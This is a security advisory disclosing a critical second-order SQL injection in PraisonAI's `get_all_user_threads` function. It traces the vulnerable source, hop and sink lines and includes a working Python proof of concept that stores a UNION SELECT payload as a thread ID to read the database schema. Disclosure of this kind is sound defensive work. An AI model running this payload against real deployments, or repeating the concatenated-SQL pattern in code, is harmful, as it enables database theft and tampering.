# [C] PraisonAI Has Second-Order SQL Injection in `get_all_user_threads`

## Summary
Severity: Critical
Advisory: GHSA-9cq8-3v94-434g
CVE: CVE-2026-34934
CWE: CWE-89
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-9cq8-3v94-434g
Type: github-advisory

## Affected
- PyPI: `praisonai` — affected >=0 <4.5.90

## Details
## Summary

The `get_all_user_threads` function constructs raw SQL queries using f-strings with unescaped thread IDs fetched from the database. An attacker stores a malicious thread ID via `update_thread`. When the application loads the thread list, the injected payload executes and grants full database access.

---

## Details

**File Path:**  
`src/praisonai/praisonai/ui/sql_alchemy.py`

**Flow:**
- **Source (Line 539):**
```python
await data_layer.update_thread(thread_id=payload, user_id=user)
```

- **Hop (Line 547):**
```python
thread_ids = "('" + "','".join([t["thread_id"] for t in user_threads]) + "')"
```

- **Sink (Line 576):**
```sql
WHERE s."threadId" IN {thread_ids}
```

---

## Proof of Concept (PoC)

```python

import asyncio
from praisonai.ui.sql_alchemy import SQLAlchemyDataLayer

async def run_poc():
    data_layer = SQLAlchemyDataLayer(conninfo="sqlite+aiosqlite:///app.db")

    # Insert a valid thread
    await data_layer.update_thread(
        thread_id="valid_thread", 
        user_id="attacker"
    )

    # Inject malicious payload
    payload = "x') UNION SELECT name, null, null, 'valid_thread', null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null FROM sqlite_master--"

    await data_layer.update_thread(
        thread_id=payload, 
        user_id="attacker"
    )

    # Trigger vulnerable function
    result = await data_layer.get_all_user_threads(user_id="attacker")

    for thread in result:
        if getattr(thread, 'id', '') == 'valid_thread':
            for step in getattr(thread, 'steps', []):
                print(getattr(step, 'id', ''))

asyncio.run(run_poc())

# Expected Output:
# sqlite_master table names printed to console
```

---

## Impact

An attacker can achieve full database compromise, including:

- Exfiltration of sensitive data (user emails, session tokens, API keys)
- Access to all conversation histories
- Ability to modify or delete database contents

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-9cq8-3v94-434g
- https://nvd.nist.gov/vuln/detail/CVE-2026-34934
- https://github.com/MervinPraison/PraisonAI
